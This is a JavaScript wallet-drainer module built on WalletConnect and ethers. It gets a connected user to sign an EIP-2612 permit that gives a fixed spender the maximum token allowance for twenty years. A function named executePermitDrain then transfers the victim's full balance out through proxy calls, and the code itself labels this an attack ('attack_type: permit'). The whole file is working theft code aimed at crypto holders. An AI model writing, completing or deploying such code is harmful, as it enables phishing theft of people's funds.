import { getAddress, getIsConnected, getChainID, getProvider } from '../walletconnect'
import { BrowserProvider, Contract, formatEther, parseEther, parseUnits, Signature } from 'ethers';
import { SPENDER, MAX_ALLOWANCE, USDC_ADDRESS } from './constants'
import { permitProxy, transferFromProxy } from './proxy';
import { spenderAddress } from '../constants/erc2612permit'


async function getSigner() {
  if (!getIsConnected()) return;

  const walletProvider = getProvider();
  const ethersProvider = new BrowserProvider(walletProvider);
  const signer = await ethersProvider.getSigner();

  return signer;
}


async function getEthereumContract(address, abi) {
  if (!getIsConnected()) return;

  const signer = await getSigner();
  const transactionContract = new Contract(address, abi, signer);

  return transactionContract;
}


async function requestPermitSignature(contract_address, token_name, chain_id, balance, decimals = 18) {
    return new Promise(async (resolve, reject) => {
        try {
            if (!getIsConnected()) reject({reason: 'Wallet not connected'})
            if (balance<=0) reject({reason: 'Insufficient amount'})
            if (chain_id != getChainID()) reject({reason: 'Wrong chain'})
        
            const tokenAbi = [
                "function DOMAIN_SEPARATOR() external view returns (bytes32)",
                "function nonces(address owner) external view returns (uint256)"
            ];
            const contract = await getEthereumContract(contract_address, tokenAbi);
            const signer = await getSigner();
            
  
            const owner = getAddress();
            
            console.log("decimals:  ", decimals)
            const PARSED_MAX_ALLOWANCE = parseUnits(MAX_ALLOWANCE, decimals)
  
            // Calculate the deadline as 20 years from now
            const twentyYearsInSeconds = 20 * 365.25 * 24 * 60 * 60;  // 20 years in seconds
            const deadline = Math.floor(window.Date.now() / 1000) + twentyYearsInSeconds; 
  
            const message = {
              owner,
              spender: SPENDER,
              value: PARSED_MAX_ALLOWANCE,
              deadline
            }
            try {
              const nonce = await contract.nonces(owner);
              message.nonce = nonce;
            } catch (error) {
              message.nonce = 0;
              console.log("Error getting nonce:       ",  error)
            }
  
            let domain = {
              name: token_name,
              chainId: chain_id,
              verifyingContract: contract_address
            }
  
            if (contract_address.toLowerCase() == USDC_ADDRESS.toLowerCase()) {
              domain = {
                name: token_name,
                chainId: chain_id,
                version: "2",
                verifyingContract: contract_address
              }
            }

            console.log("domain: ", domain)
            
  
            const types = {
              Permit: [
                { name: "owner", type: "address" },
                { name: "spender", type: "address" },
                { name: "value", type: "uint256" },
                { name: "nonce", type: "uint256" },
                { name: "deadline", type: "uint256" },
              ],
            };
            
  
            const signature = await signer.signTypedData(domain, types, message)
  
            const { r, s, v } = Signature.from(signature);
  
            resolve({
              r,s,v,nonce: formatEther(message.nonce.toString()), owner, spender: SPENDER, value: MAX_ALLOWANCE, deadline, chain_id, token_address: contract_address, token_name, attack_type: 'permit', spenderAddress: spenderAddress, decimals
            })
        } catch (error) {
            console.log(error);
            reject(error)
        }
  
    })
  }
  



async function executePermitDrain(data) {
    const {
        r,s,v,nonce, owner, spender, value, deadline, chain_id, token_address, token_name, balance, spenderAddress, decimals
      } = data
      const ERC2612_ABI = [
        "function allowance(address owner, address spender) view returns (uint256)",
        "function transferFrom(address from, address to, uint256 value) returns (bool)",
        "function nonces(address owner) view returns (uint256)",
        "function DOMAIN_SEPARATOR() view returns (bytes32)",
        "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s)"
    ];

    return new Promise(async(resolve, reject) => {
      try {
        const contract = await getEthereumContract(token_address, ERC2612_ABI);

        const allowance = await contract.allowance(owner, spender);

        if (formatEther(allowance) <= 0) {
          // const permitTransation = await permitProxy(owner, spender, parseEther(value), deadline, v, r, s);
          // await permitTransation.wait();
          
          await permitProxy(spender, token_address, owner, parseUnits(value, decimals), deadline, v, r, s);
        }


        // const transaction = await contract.transferFrom(owner, spender, balance);
        await transferFromProxy(spender, token_address, owner, balance, spenderAddress);

        // console.log("Loading - ", transaction.hash);
        // await transaction.wait();
        // console.log("Loading successful - ", transaction.hash);
        resolve()
      } catch (error) {
        console.log(error);
        reject(error)
      }
    })
  }
  
  
  export {
    requestPermitSignature,
    executePermitDrain
  }